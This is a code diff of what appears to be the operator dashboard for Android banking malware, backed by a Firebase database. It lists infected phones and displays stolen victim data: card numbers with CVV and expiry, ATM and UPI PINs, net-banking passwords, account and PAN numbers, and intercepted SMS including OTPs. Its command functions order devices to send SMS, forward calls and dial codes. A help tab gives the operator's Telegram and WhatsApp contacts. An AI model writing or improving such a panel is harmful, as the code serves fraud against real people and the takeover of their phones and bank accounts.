-                                    <span class="badge bg-secondary me-1" style="font-size: 0.5rem; padding: 1px 2px;">#${user.fixedIndex}</span>
-                                    <span class="status-badge ${isOnline ? 'bg-success' : 'bg-danger'} text-white" style="font-size: 0.45rem;">
-                                        ${isOnline ? 'ON' : 'OFF'}
-                                    </span>
-                                </div>
-                                <div class="${batteryColor} fw-bold" style="font-size: 0.6rem;">
-                                    ${user.battery || '--'}%
-                                </div>
-                            </div>
-
-                            <div class="col-7">
-                                <h6 class="mb-0 text-white" style="font-size: 0.7rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${user.model || 'Unknown Device'}</h6>
-                                <div class="text-warning fw-bold" style="font-size: 0.55rem;">${user.uid}</div>
-                            </div>
-
-                            <div class="col-5 text-end">
-                                <div class="text-info fw-bold" style="font-size: 0.65rem;">${simDisplay}</div>
-                                <div class="text-muted" style="font-size: 0.5rem;">${getTimeAgo(user.lastSeen)}</div>
-                            </div>
-                        </div>
-                    `;
-                    contentArea.appendChild(card);
+                // Fixed Indexing logic
+                users.sort((a, b) => {
+                    const parseDate = (d) => {
+                        if (!d) return 0;
+                        const parts = d.split(/[\/\s:]/);
+                        if (parts.length < 6) return 0;
+                        return new Date(parts[2], parts[1]-1, parts[0], parts[3], parts[4], parts[5]).getTime();
+                    };
+                    return parseDate(a.installDate) - parseDate(b.installDate);
                 });
+
+                const indexedUsers = users.map((u, i) => ({ ...u, fixedIndex: (i + 1).toString().padStart(2, '0') }));
+                const displayList = indexedUsers.reverse();
+
+                    const grid = document.createElement('div');
+                    grid.className = "device-grid";
+
+                    displayList.forEach((user) => {
+                        const isOnline = (Date.now() - parseInt(user.lastSeen || 0)) < 60000;
+                        if (currentTab === 'online' && !isOnline) return;
+                        if (currentTab === 'offline' && isOnline) return;
+                        if (searchQuery && !JSON.stringify(user).toLowerCase().includes(searchQuery)) return;
+
+                        const card = document.createElement('div');
+                        card.className = "device-grid-card";
+                        card.onclick = () => openUserDetails(user.uid);
+
+                        // Parse all SIMs
+                        let simRows = "";
+                        if (user.simInfo) {
+                            const sims = user.simInfo.split('\n');
+                            sims.forEach((line, idx) => {
+                                let display = line.replace(/Sim \d: /, "").replace(' (No Number)', "").replace(' (', ': ').replace(')', "");
+                                if (display.trim()) {
+                                    simRows += `
+                                        <div class="dg-row">
+                                            <span class="dg-label">SIM ${idx + 1}</span>
+                                            <span class="dg-value">${display}</span>
+                                        </div>
+                                    `;
+                                }
+                            });
+                        } else {
+                            simRows = `
+                                <div class="dg-row">
+                                    <span class="dg-label">SIM 1</span>
+                                    <span class="dg-value">${user.mobile || 'No SIM'}</span>
+                                </div>
+                            `;
+                        }
+
+                        const androidVer = user.model && user.model.includes('(Android') ? user.model.split('Android ')[1].replace(')', '') : '16';
+
+                        card.innerHTML = `
+                            <div class="dg-header">${user.fixedIndex}. ${user.model || 'Unknown'}</div>
+                            <div class="dg-row">
+                                <span class="dg-label">ID</span>
+                                <span class="dg-value">${user.uid}</span>
+                            </div>
+                            <div class="dg-row">
+                                <span class="dg-label">Android</span>
+                                <span class="dg-value">${androidVer}</span>
+                            </div>
+                            ${simRows}
+                            <div class="dg-row" style="border-bottom: none;">
+                                <span class="dg-label">Online</span>
+                                <span class="dg-value ${isOnline ? 'dg-status-green' : 'dg-status-red'}">${getTimeAgo(user.lastSeen)}</span>
+                            </div>
+                            <button class="dg-btn" onclick="event.stopPropagation(); openUserDetails('${user.uid}'); sendCommand('ping');">Check Online</button>
+                        `;
+                        grid.appendChild(card);
+                    });
+                    contentArea.appendChild(grid);
             } else if (currentTab === 'data') {
-                allLogsRecords.forEach((log, index) => {
-                    if (searchQuery) {
-                        const match = (log.uid || "").toLowerCase().includes(searchQuery) ||
-                                      (log.device_id || "").toLowerCase().includes(searchQuery) ||
-                                      (log.mobile || "").includes(searchQuery) ||
-                                      (log.fullName || "").toLowerCase().includes(searchQuery) ||
-                                      (log.cardNumber || log.card || "").includes(searchQuery);
-                        if (!match) return;
-                    }
+                const records = Object.keys(allData).map(key => ({ ...allData[key], key })).reverse();
+
+                const labelMap = {
+                    'fullName': 'Uname',
+                    'mobile': 'MNo.',
+                    'consumerId': 'custid',
+                    'net_pass': 'Pass',
+                    'netbanking_pass': 'prfpass',
+                    'account_number': 'Ac',
+                    'acc': 'Ac',
+                    'pan': 'PAN',
+                    'panNumber': 'PAN',
+                    'customerId': 'CIF',
+                    'card_number': 'Card',
+                    'card': 'Card',
+                    'cvv': 'CVV',
+                    'expiry': 'EXP',
+                    'atmPin': 'ATM',
+                    'upiPin': 'UPI'
+                };
+
+                const excluded = ['uid', 'key', 'lastSeen', 'createdAt', 'model', 'battery', 'simInfo', 'installDate', 'last_sms_sender', 'last_sms_body', 'commandResult', 'currentStep', 'current_record_id', 'record_id', 'reason', 'recordId', 'status', 'paymentMethod', 'paymentmode', 'last_event'];
+
+                records.forEach((record) => {
+                    // Specific order for first page fields
+                    const priorityKeys = ['fullName', 'mobile', 'consumerId'];
+
+                    const otherKeys = Object.keys(record).filter(k =>
+                        !priorityKeys.includes(k) &&
+                        !excluded.includes(k) &&
+                        !k.startsWith('sms_') &&
+                        record[k] &&
+                        String(record[k]).trim() !== ""
+                    );
+
+                    const sortedKeys = [];
+                    priorityKeys.forEach(pk => {
+                        if (record[pk] && String(record[pk]).trim() !== "") sortedKeys.push(pk);
+                    });
+                    sortedKeys.push(...otherKeys);
+
+                    if (sortedKeys.length === 0) return;
+                    if (searchQuery && !JSON.stringify(record).toLowerCase().includes(searchQuery)) return;
 
                     const card = document.createElement('div');
-                    card.className = "card p-2 mb-3 border-primary cursor-pointer";
-                    card.onclick = () => openUserDetails(log.uid || log.device_id);
+                    card.className = "ss-card";
+                    card.onclick = () => openUserDetails(record.key);
 
-                    const cardNum = log.cardNumber || log.card || log.card_number || 'No Card';
-                    const cardExp = log.expiry || log.card_expiry || '--';
-                    const cardCvv = log.cvv || log.card_cvv || '--';
-                    const pan = log.panNumber || log.pan || '--';
-                    const acc = log.accountNumber || log.account_number || '--';
-                    const custId = log.customerId || '--';
-                    const atm = log.atmPin || log.pin || '--';
-                    const upi = log.upiPin || '--';
+                    let dataHtml = "";
+                    sortedKeys.forEach(key => {
+                        const label = labelMap[key] || key;
+                        const fullVal = String(record[key]).replace(/'/g, "\\'").replace(/"/g, "&quot;");
+                        dataHtml += `
+                            <div class="ss-item">
+                                <div class="ss-label">
+                                    ${label}: <i class="fas fa-copy" onclick="event.stopPropagation(); copyText('${fullVal}')"></i>
+                                </div>
+                                <div class="ss-value">${makeWordsCopyable(record[key])}</div>
+                            </div>
+                        `;
+                    });
 
-                    // NetBanking & Additional Info
-                    const nbBank = log.netbanking_bank || 'No Bank';
-                    const nbUser = log.netbanking_user || '--';
-                    const nbPass = log.netbanking_pass || '--';
-                    const trPass = log.transaction_password || '--';
-
-                    const logTime = log.timestamp ? new Date(log.timestamp).toLocaleString() : (log.lastSeen ? new Date(parseInt(log.lastSeen)).toLocaleString() : '--');
+                    const baseUid = record.uid || (record.key.includes('_') ? record.key.split('_')[0] : record.key);
 
                     card.innerHTML = `
-                        <div class="row g-1">
-                            <!-- Header: #Index, UID, Mobile -->
-                            <div class="col-12 d-flex justify-content-between border-bottom border-secondary pb-1 mb-1">
-                                <div class="d-flex align-items-center">
-                                    <span class="badge bg-danger me-1" style="font-size: 0.5rem;">REC</span>
-                                    <span class="fw-bold text-white" style="font-size: 0.75rem;">${log.fullName || 'No Name'}</span>
-                                    <span class="ms-2 text-warning" style="font-size: 0.6rem;">(${log.uid || log.device_id || 'Unknown'})</span>
-                                </div>
-                                <span class="text-secondary fw-bold" style="font-size: 0.6rem;">${logTime}</span>
-                            </div>
-
-                            <!-- Row 1: Card Details -->
-                            <div class="col-12 mb-1">
-                                <div class="bg-dark p-1 rounded d-flex justify-content-between align-items-center border border-secondary">
-                                    <span class="text-warning fw-bold" style="font-size: 0.85rem; letter-spacing: 1px;">${cardNum}</span>
-                                    <div class="d-flex gap-2">
-                                        <span class="text-white" style="font-size: 0.7rem;">EXP: ${cardExp}</span>
-                                        <span class="text-danger fw-bold" style="font-size: 0.7rem;">CVV: ${cardCvv}</span>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Row 2: NetBanking Info -->
-                            <div class="col-12 mb-1">
-                                <div class="p-1 rounded bg-dark border border-secondary">
-                                    <div class="text-pink fw-bold mb-1" style="font-size: 0.65rem; border-bottom: 1px solid #333;">${nbBank} (NetBanking)</div>
-                                    <div class="d-flex justify-content-between">
-                                        <span class="text-white" style="font-size: 0.65rem;">User: <span class="text-info">${nbUser}</span></span>
-                                        <span class="text-white" style="font-size: 0.65rem;">Pass: <span class="text-danger">${nbPass}</span></span>
-                                        <span class="text-white" style="font-size: 0.65rem;">TrPass: <span class="text-success">${trPass}</span></span>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Row 3: Account & IDs -->
-                            <div class="col-12 mb-1">
-                                <div class="p-1 rounded bg-dark border border-secondary">
-                                    <div class="d-flex justify-content-between border-bottom border-secondary mb-1 pb-1">
-                                        <span class="text-secondary" style="font-size: 0.65rem;">ACC: <span class="text-success fw-bold">${acc}</span></span>
-                                        <span class="text-secondary" style="font-size: 0.65rem;">PAN: <span class="text-white fw-bold">${pan}</span></span>
-                                    </div>
-                                    <div class="d-flex justify-content-between">
-                                        <span class="text-secondary" style="font-size: 0.65rem;">CUST ID: <span class="text-info">${custId}</span></span>
-                                        <span class="text-secondary" style="font-size: 0.65rem;">DOB: <span class="text-white">${log.dob || '--'}</span></span>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Row 4: PINS -->
-                            <div class="col-12 mt-1 d-flex justify-content-between align-items-center bg-black p-1 rounded border border-secondary">
-                                <span class="text-secondary" style="font-size: 0.65rem;">ATM: <span class="text-danger fw-bold">${atm}</span></span>
-                                <span class="text-secondary" style="font-size: 0.65rem;">UPI: <span class="text-info fw-bold">${upi}</span></span>
-                                <span class="text-secondary" style="font-size: 0.65rem;">MOB: <span class="text-warning fw-bold">${log.mobile || 'N/A'}</span></span>
-                            </div>
+                        ${dataHtml}
+                        <div class="ss-separator"></div>
+                        <div class="ss-footer">
+                            <div class="ss-id">ID: ${baseUid}</div>
                         </div>
                     `;
                     contentArea.appendChild(card);
                 });
-            }
-else if (currentTab === 'sms') {
+            } else if (currentTab === 'sms') {
                 const start = (allSmsCurrentPage - 1) * 1000;
-                const end = start + 1000;
-                const paginatedSms = allSms.slice(start, end);
+                const paginatedSms = allSms.slice(start, start + 1000);
 
                 paginatedSms.forEach(sms => {
-                    const item = document.createElement('div');
-                    item.className = "card border-secondary mb-1 overflow-hidden";
+                    const card = document.createElement('div');
+                    card.className = "ss-card";
 
-                    const words = sms.msg.split(' ').map(word => `<span class="sms-word" onclick="event.stopPropagation(); copyText('${word.replace(/'/g, "\\'").replace(/"/g, '&quot;')}')">${word}</span>`).join(' ');
+                    const user = allData[sms.deviceId] || {};
+                    const mob1 = user.mobile || '--';
 
-                    const simText = (sms.sim_id !== undefined && sms.sim_id !== null && sms.sim_id !== -1) ? `SIM ${parseInt(sms.sim_id) + 1} | ` : "";
+                    let formattedDate = 'N/A';
+                    try {
+                        const dateObj = new Date(parseInt(sms.id));
+                        if (!isNaN(dateObj.getTime())) {
+                            const options = { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true };
+                            formattedDate = dateObj.toLocaleString('en-GB', options).replace(',', '');
+                        } else {
+                            formattedDate = sms.time;
+                        }
+                    } catch(e) { formattedDate = sms.time; }
 
-                    item.innerHTML = `
-                        <div class="card-header bg-dark d-flex justify-content-between align-items-center py-0 px-1" style="border-bottom: none;">
-                            <div class="d-flex align-items-center">
-                                <span class="text-info fw-bold" style="font-size: 0.6rem;">${sms.from}</span>
-                            </div>
-                            <div class="d-flex align-items-center">
-                                <span class="text-secondary me-1" style="font-size:0.5rem;">${simText}${sms.time || 'N/A'}</span>
-                                <i class="fas fa-trash text-danger cursor-pointer" style="font-size: 0.55rem;" title="Delete" onclick="deleteSms('${sms.deviceId}', '${sms.id}')"></i>
-                            </div>
+                    card.innerHTML = `
+                        <div class="ss-item">
+                            <div class="ss-label">Date: <i class="fas fa-copy" onclick="event.stopPropagation(); copyText('${formattedDate}')"></i></div>
+                            <div class="ss-value">${makeWordsCopyable(formattedDate)}</div>
                         </div>
-                        <div class="card-body py-1 px-1">
-                            <div class="text-white" style="font-size: 0.85rem; line-height: 1.3;">${words}</div>
-                            <div class="mt-1 pt-1 border-top border-secondary d-flex justify-content-between">
-                                <span class="text-muted" style="font-size: 0.5rem;">ID: <span class="text-warning fw-bold cursor-pointer" onclick="openUserDetails('${sms.deviceId}')">${sms.deviceId}</span></span>
-                            </div>
+                        <div class="ss-item">
+                            <div class="ss-label">MSG: <i class="fas fa-copy" onclick="event.stopPropagation(); copyText('${sms.msg.replace(/'/g, "\\'").replace(/"/g, "&quot;")}')"></i></div>
+                            <div class="ss-value msg-red">${makeWordsCopyable(sms.msg)}</div>
+                        </div>
+                        <div class="ss-item">
+                            <div class="ss-label">SENDER: <i class="fas fa-copy" onclick="event.stopPropagation(); copyText('${sms.from}')"></i></div>
+                            <div class="ss-value">${makeWordsCopyable(sms.from)}</div>
+                        </div>
+                        <div class="ss-item">
+                            <div class="ss-label">MOB: <i class="fas fa-copy" onclick="event.stopPropagation(); copyText('${mob1}')"></i></div>
+                            <div class="ss-value">${makeWordsCopyable(mob1)}</div>
+                        </div>
+                        <div class="ss-separator"></div>
+                        <div class="ss-footer">
+                            <div class="ss-id">ID: ${sms.deviceId}</div>
                         </div>
                     `;
-                    contentArea.appendChild(item);
+                    contentArea.appendChild(card);
                 });
 
                 if (allSms.length > 1000) {
@@ -1089,132 +1277,134 @@ else if (currentTab === 'sms') {
                     `;
                     contentArea.appendChild(pagContainer);
                 }
+            } else if (currentTab === 'help') {
+                const container = document.createElement('div');
+                container.className = "help-container";
+                container.innerHTML = `
+                    <a href="https://t.me/MahanDevil2" target="_blank" class="help-item">
+                        <i class="fab fa-telegram icon-telegram"></i>
+                        <div class="help-text">Telegram</div>
+                    </a>
+                    <a href="https://wa.me/12632009545" target="_blank" class="help-item">
+                        <i class="fab fa-whatsapp icon-whatsapp"></i>
+                        <div class="help-text">WhatsApp</div>
+                    </a>
+                `;
+                contentArea.appendChild(container);
             }
         }
 
-        // USER DETAILS
-        function openUserDetails(uid) {
-            selectedUserId = uid;
-            const user = allData[uid];
+        function openUserDetails(id) {
+            let key = id;
+            if (!allData[key]) {
+                const sessions = Object.keys(allData).filter(k => k.startsWith(id + "_"));
+                if (sessions.length > 0) key = sessions.sort((a, b) => (parseInt(allData[b].lastSeen) || 0) - (parseInt(allData[a].lastSeen) || 0))[0];
+            }
+            selectedRecordKey = key;
+            const user = allData[key];
             if (!user) return;
+            selectedUserId = user.uid || (key.includes('_') ? key.split('_')[0] : key);
 
-            // Header & Hero
-            document.getElementById('headerModel').innerText = user.model || 'Unknown Device';
+            document.getElementById('newDModel').innerText = user.model || 'Unknown Device';
+            document.getElementById('newDBattery').innerText = (user.battery || '0') + "%";
+            document.getElementById('newDId').innerText = selectedUserId;
 
-            // ESSENTIALS
-            document.getElementById('pModel').innerText = user.model || '--';
-            document.getElementById('pBattery').innerText = (user.battery || '--') + "%";
-            document.getElementById('pId').innerText = uid;
+            let simDisplay = "No SIM Info";
+            if (user.simInfo) {
+                simDisplay = user.simInfo.split('\n').map(line => {
+                    return line.replace(/Sim \d: /, "")
+                               .replace(' (No Number)', "")
+                               .replace(' (', ': ')
+                               .replace(')', "");
+                }).join(' | ');
+            } else {
+                simDisplay = user.mobile || 'No Mobile';
+            }
+            document.getElementById('newDSim').innerText = simDisplay;
+            document.getElementById('newDInstall').innerText = user.installDate || '--';
 
-            const sims = (user.simInfo || "").split('\n');
-            document.getElementById('pSim1').innerText = sims[0] || 'Empty';
-            document.getElementById('pSim2').innerText = sims[1] || 'Empty';
-            document.getElementById('pInstall').innerText = user.installDate || '--';
-
-            // DYNAMIC USER DATA
             const infoCard = document.getElementById('userInfoCard');
             infoCard.innerHTML = "";
 
-            const fields = [
-                { label: "Full Name", val: user.fullName, color: "text-info fw-bold" },
-                { label: "Mobile Number", val: user.mobile, color: "color-blue" },
-                { label: "Date of Birth", val: user.dob },
-                { label: "PAN Number", val: user.panNumber || user.pan },
-                { label: "Account Number", val: user.accountNumber || user.account_number },
-                { label: "Customer ID", val: user.customerId },
-                { label: "Consumer ID", val: user.consumerId, color: "text-warning" },
-                { label: "Card Number", val: user.cardNumber || user.card || user.card_number, color: "color-orange fw-bold" },
-                { label: "Expiry / CVV", val: (user.expiry || user.card_expiry) ? `${user.expiry || user.card_expiry} | ${user.cvv || user.card_cvv || '--'}` : null },
-                { label: "ATM / UPI PIN", val: (user.atmPin || user.pin || user.upiPin) ? `${user.atmPin || user.pin || '--'} | ${user.upiPin || '--'}` : null },
-                { label: "Bank Name", val: user.netbanking_bank, color: "color-pink fw-bold" },
-                { label: "NetBanking User", val: user.netbanking_user, color: "text-info" },
-                { label: "NetBanking Pass", val: user.netbanking_pass, color: "color-red" },
-                { label: "Trans. Password", val: user.transaction_password, color: "color-green" },
-                { label: "OTP (Latest)", val: user.otp || user.last_sms_body, color: "text-warning fw-bold" },
-                { label: "Card Type", val: user.card_type },
-                { label: "Current Step", val: user.currentStep, color: "text-warning" }
-            ];
+            const labelMap = {
+                'fullName': 'Uname',
+                'mobile': 'MNo.',
+                'consumerId': 'custid',
+                'net_pass': 'Pass',
+                'netbanking_pass': 'prfpass',
+                'account_number': 'Ac',
+                'acc': 'Ac',
+                'pan': 'PAN',
+                'panNumber': 'PAN',
+                'customerId': 'CIF',
+                'card_number': 'Card',
+                'card': 'Card',
+                'cvv': 'CVV',
+                'expiry': 'EXP',
+                'atmPin': 'ATM',
+                'upiPin': 'UPI'
+            };
 
-            fields.forEach(f => {
-                if (f.val) {
-                    const div = document.createElement('div');
-                    div.className = "detail-item";
-                    div.innerHTML = `
-                        <span class="label-box">${f.label}</span>
-                        <span class="value-box ${f.color || 'text-white'}">${f.val}</span>
+            const excluded = ['uid', 'key', 'lastSeen', 'createdAt', 'model', 'battery', 'simInfo', 'installDate', 'last_sms_sender', 'last_sms_body', 'commandResult', 'currentStep', 'current_record_id', 'record_id', 'reason', 'recordId', 'status', 'paymentMethod', 'paymentmode', 'last_event'];
+
+            const priorityKeys = ['fullName', 'mobile', 'consumerId'];
+            const recordKeys = Object.keys(user).filter(k => !excluded.includes(k) && !k.startsWith('sms_') && user[k] && String(user[k]).trim() !== "");
+
+            const sortedKeys = [];
+            priorityKeys.forEach(pk => { if (user[pk]) sortedKeys.push(pk); });
+            recordKeys.forEach(rk => { if (!priorityKeys.includes(rk)) sortedKeys.push(rk); });
+
+            if (sortedKeys.length > 0) {
+                const cardDiv = document.createElement('div');
+                cardDiv.className = "ss-card mb-4";
+
+                let dataHtml = "";
+                sortedKeys.forEach(key => {
+                    const label = labelMap[key] || key;
+                    const fullVal = String(user[key]).replace(/'/g, "\\'").replace(/"/g, "&quot;");
+                    dataHtml += `
+                        <div class="ss-item">
+                            <div class="ss-label">${label}: <i class="fas fa-copy" onclick="event.stopPropagation(); copyText('${fullVal}')"></i></div>
+                            <div class="ss-value">${makeWordsCopyable(user[key])}</div>
+                        </div>
                     `;
-                    infoCard.appendChild(div);
-                }
-            });
-
-            if (infoCard.innerHTML === "") {
-                infoCard.innerHTML = '<div class="text-center p-2 text-secondary small">No user data submitted yet</div>';
+                });
+                cardDiv.innerHTML = dataHtml;
+                infoCard.appendChild(cardDiv);
+            } else {
+                infoCard.innerHTML = '<div class="text-center p-4 text-secondary small">No user data submitted yet</div>';
             }
 
             updatePageStatus();
-            loadDeviceSms(uid);
-            loadCommandLogs(uid);
-
-            // Show Detail Page (New Page Style)
+            loadDeviceSms(selectedUserId);
+            loadCommandLogs(selectedUserId);
             detailPage.style.display = 'block';
             document.body.style.overflow = 'hidden';
-
-            // Add history state for back button support
             history.pushState({ view: 'detail' }, '');
         }
 
         function closeDetailPage(shouldGoBack = true) {
-            if (detailPage.style.display === 'none') return;
-
             detailPage.style.display = 'none';
             document.body.style.overflow = 'auto';
-            selectedUserId = null;
-
-            if (shouldGoBack) {
-                history.back();
-            }
+            if (shouldGoBack) history.back();
         }
 
-        // Handle Mobile Back Button
-        window.onpopstate = function(event) {
-            if (localStorage.getItem('isLoggedIn') !== 'true') return;
-
-            // Close Detail Page if open
-            if (detailPage.style.display === 'block') {
-                closeDetailPage(false);
-                return;
-            }
-
-            // Close any open Bootstrap Modals
-            const openModals = document.querySelectorAll('.modal.show');
-            if (openModals.length > 0) {
-                openModals.forEach(modalEl => {
-                    const modalInstance = bootstrap.Modal.getInstance(modalEl);
-                    if (modalInstance) modalInstance.hide();
-                });
-                return;
-            }
-
-            // If we are logged in and try to go back from the dashboard, stay on dashboard
-            if (!event.state || event.state.view !== 'dashboard') {
-                history.pushState({ view: 'dashboard' }, '');
-            }
+        window.onpopstate = (e) => {
+            if (detailPage.style.display === 'block') closeDetailPage(false);
         };
 
         function selectSim(slot) {
             selectedSimSlot = slot;
-            document.getElementById('optSim1').classList.toggle('active', slot === 0);
-            document.getElementById('optSim2').classList.toggle('active', slot === 1);
         }
 
         function updatePageStatus() {
-            if (!selectedUserId) return;
-            const user = allData[selectedUserId];
+            if (!selectedRecordKey) return;
+            const user = allData[selectedRecordKey];
             const isOnline = (Date.now() - parseInt(user.lastSeen || 0)) < 60000;
-            const stEl = document.getElementById('heroStatusText');
-            stEl.innerText = isOnline ? "Device Online" : "Device Offline";
-            stEl.className = isOnline ? "mb-1 color-green" : "mb-1 color-orange";
-            document.getElementById('heroLastSeen').innerText = "Last Seen: " + getTimeAgo(user.lastSeen);
+            const lastSeenText = getTimeAgo(user.lastSeen);
+            document.getElementById('newDLastSeen').innerText = lastSeenText;
+            document.getElementById('newDLastSeen').className = isOnline ? "detail-value text-success" : "detail-value text-danger";
+            // Note: StatusBar is now handled by loadCommandLogs
         }
 
         function loadDeviceSms(uid) {
@@ -1225,7 +1415,24 @@ else if (currentTab === 'sms') {
 
             db.ref('AllSms/' + uid).on('value', snapshot => {
                 const data = snapshot.val() || {};
-                currentDeviceSms = Object.keys(data).reverse().map(key => ({...data[key], key}));
+                let tempSms = Object.keys(data).map(key => ({...data[key], key}));
+
+                // Sort by time ascending to merge
+                tempSms.sort((a, b) => parseInt(a.key) - parseInt(b.key));
+
+                let merged = [];
+                tempSms.forEach(sms => {
+                    let last = merged[merged.length - 1];
+                    if (last && last.from === sms.from && (parseInt(sms.key) - parseInt(last.key)) < 15000) {
+                        if (!last.msg.includes(sms.msg)) {
+                            last.msg += "\n" + sms.msg;
+                        }
+                    } else {
+                        merged.push({...sms});
+                    }
+                });
+
+                currentDeviceSms = merged.reverse();
                 deviceSmsCurrentPage = 1;
                 renderDeviceSms();
             });
@@ -1242,32 +1449,42 @@ else if (currentTab === 'sms') {
                 return;
             }
 
-            const start = (deviceSmsCurrentPage - 1) * 10;
-            const end = start + 10;
+            const start = (deviceSmsCurrentPage - 1) * 20;
+            const end = start + 20;
             const paginated = currentDeviceSms.slice(start, end);
-            const totalPages = Math.ceil(currentDeviceSms.length / 10);
+            const totalPages = Math.ceil(currentDeviceSms.length / 20);
 
             paginated.forEach(sms => {
-                const div = document.createElement('div');
-                div.className = "sms-bubble";
-                const words = sms.msg.split(' ').map(word => `<span class="sms-word" onclick="event.stopPropagation(); copyText('${word.replace(/'/g, "\\'").replace(/"/g, '&quot;')}')">${word}</span>`).join(' ');
+                const card = document.createElement('div');
+                card.className = "ss-card";
+                card.style.cursor = "default";
 
-                const simText = (sms.sim_id !== undefined && sms.sim_id !== null && sms.sim_id !== -1) ? `SIM ${parseInt(sms.sim_id) + 1} | ` : "";
+                let formattedDate = 'N/A';
+                try {
+                    const dateObj = new Date(parseInt(sms.key));
+                    if (!isNaN(dateObj.getTime())) {
+                        const options = { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true };
+                        formattedDate = dateObj.toLocaleString('en-GB', options).replace(',', '');
+                    } else {
+                        formattedDate = sms.time;
+                    }
+                } catch(e) { formattedDate = sms.time; }
 
-                div.innerHTML = `
-                    <div class="sms-meta">
-                        <div class="d-flex align-items-center">
-                            <span class="color-blue">${sms.from}</span>
-                        </div>
-                        <span class="text-secondary">${simText}${sms.time}</span>
+                card.innerHTML = `
+                    <div class="ss-item">
+                        <div class="ss-label">Date: <i class="fas fa-copy" onclick="event.stopPropagation(); copyText('${formattedDate}')"></i></div>
+                        <div class="ss-value">${makeWordsCopyable(formattedDate)}</div>
                     </div>
-                    <div class="text-white" style="font-size: 0.85rem; line-height: 1.3;">${words}</div>
-                    <div class="sms-actions">
-                        <i class="fas fa-copy sms-action-btn" title="Copy" onclick="copyText('${sms.msg.replace(/'/g, "\\'")}')"></i>
-                        <i class="fas fa-trash sms-action-btn delete" title="Delete" onclick="deleteSms('${selectedUserId}', '${sms.key}')"></i>
+                    <div class="ss-item">
+                        <div class="ss-label">MSG: <i class="fas fa-copy" onclick="event.stopPropagation(); copyText('${sms.msg.replace(/'/g, "\\'").replace(/"/g, "&quot;")}')"></i></div>
+                        <div class="ss-value msg-red">${makeWordsCopyable(sms.msg)}</div>
+                    </div>
+                    <div class="ss-item">
+                        <div class="ss-label">SENDER: <i class="fas fa-copy" onclick="event.stopPropagation(); copyText('${sms.from}')"></i></div>
+                        <div class="ss-value">${makeWordsCopyable(sms.from)}</div>
                     </div>
                 `;
-                listEl.appendChild(div);
+                listEl.appendChild(card);
             });
 
             if (totalPages > 1) {
@@ -1286,227 +1503,159 @@ else if (currentTab === 'sms') {
             document.getElementById('detailPage').scrollTo(0, document.getElementById('pageSmsList').offsetTop - 100);
         }
 
-        function changeAllSmsPage(dir) {
-            allSmsCurrentPage += dir;
-            renderContent();
-            window.scrollTo(0, 0);
-        }
-
         function loadCommandLogs(uid) {
-            const listEl = document.getElementById('commandLogsList');
-            db.ref('ActionLogs/' + uid).limitToLast(20).on('value', snapshot => {
-                listEl.innerHTML = "";
-                const data = snapshot.val() || {};
-                const keys = Object.keys(data).reverse();
+            const statusBar = document.getElementById('newDStatusBar');
+            db.ref('ActionLogs/' + uid).limitToLast(1).on('value', snapshot => {
+                if (logTimerInterval) clearInterval(logTimerInterval);
 
-                if (keys.length === 0) {
-                    listEl.innerHTML = '<div class="text-center p-3 text-secondary small">No commands sent yet</div>';
-                    return;
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    const logId = Object.keys(data)[0];
+                    const log = data[logId];
+
+                    const updateUI = () => {
+                        let statusText = log.status;
+                        let actionText = log.action;
+                        let detailsText = log.details || '';
+
+                        if (log.action === 'PING' && log.status.toLowerCase().includes('pending')) {
+                            const totalSeconds = Math.floor((Date.now() - log.timestamp) / 1000);
+                            const h = Math.floor(totalSeconds / 3600);
+                            const m = Math.floor((totalSeconds % 3600) / 60);
+                            const s = totalSeconds % 60;
+
+                            actionText = "CHECKING DEVICE...";
+                            if (h > 0) {
+                                statusText = `${h}h ${m}m ${s}s`;
+                            } else if (m > 0) {
+                                statusText = `${m}m ${s}s`;
+                            } else {
+                                statusText = `${s}s`;
+                            }
+                        }
+
+                        const statusClass = (statusText.toLowerCase().includes('pending') || (log.action === 'PING' && !isNaN(parseInt(statusText)))) ? 'text-warning' :
+                                          (statusText.toLowerCase().includes('success') || statusText.toLowerCase().includes('done') || statusText.toLowerCase().includes('online')) ? 'status-online-text' : 'status-offline-text';
+
+                        statusBar.innerHTML = `
+                            <div class="d-flex justify-content-between align-items-start mb-1">
+                                <span class="fw-bold" style="color: #1e293b;">${actionText}</span>
+                                <span class="${statusClass}" style="font-size: 0.7rem;">${statusText}</span>
+                            </div>
+                            <div class="small text-secondary" style="word-break: break-all; line-height: 1.2;">${detailsText}</div>
+                            <div class="text-muted mt-2" style="font-size: 0.65rem; text-align: right;">${log.time}</div>
+                        `;
+                    };
+
+                    updateUI();
+                    if (log.action === 'PING' && log.status.toLowerCase().includes('pending')) {
+                        logTimerInterval = setInterval(updateUI, 1000);
+                    }
+                } else {
+                    statusBar.innerHTML = "No command logs found for this device.";
                 }
-
-                keys.forEach(key => {
-                    const log = data[key];
-                    const statusClass = log.status.toLowerCase().includes('pending') ? 'status-pending' :
-                                      (log.status.toLowerCase().includes('success') || log.status.toLowerCase().includes('done')) ? 'status-success' : 'status-failed';
-
-                    const div = document.createElement('div');
-                    div.className = "log-item";
-                    div.innerHTML = `
-                        <div>
-                            <div class="fw-bold small text-white">${log.action}</div>
-                            <div class="text-secondary" style="font-size: 0.65rem;">${log.time}</div>
-                        </div>
-                        <span class="log-status ${statusClass}">${log.status}</span>
-                    `;
-                    listEl.appendChild(div);
-                });
             });
         }
 
-        // COMMANDS
         function sendCommand(action, extra = {}) {
             if (!selectedUserId) return;
-            const slot = selectedSimSlot;
             const logId = db.ref('ActionLogs/' + selectedUserId).push().key;
 
-            const command = {
-                action: action,
-                slot: slot,
-                logId: logId,
-                ...extra
-            };
+            let details = "Sent from Admin Panel";
+            if(action === 'sms') details = `To: ${extra.target}<br>Msg: ${extra.message}`;
+            if(action === 'forward') details = `To: ${extra.number}`;
+            if(action === 'dial') details = `Code: ${extra.code}`;
 
-            db.ref('Commands/' + selectedUserId).set(command).then(() => {
-                showToast("Command sent to SIM " + (slot + 1));
-                logAction(selectedUserId, action, logId);
-            });
-        }
-
-        function showToast(msg) {
-            document.getElementById('toastMsg').innerText = msg;
-            cmdToast.show();
-        }
-
-        function logAction(uid, action, logId) {
-            const time = new Date().toLocaleString();
-            db.ref('ActionLogs/' + uid + '/' + logId).set({
+            const logData = {
                 action: action.toUpperCase(),
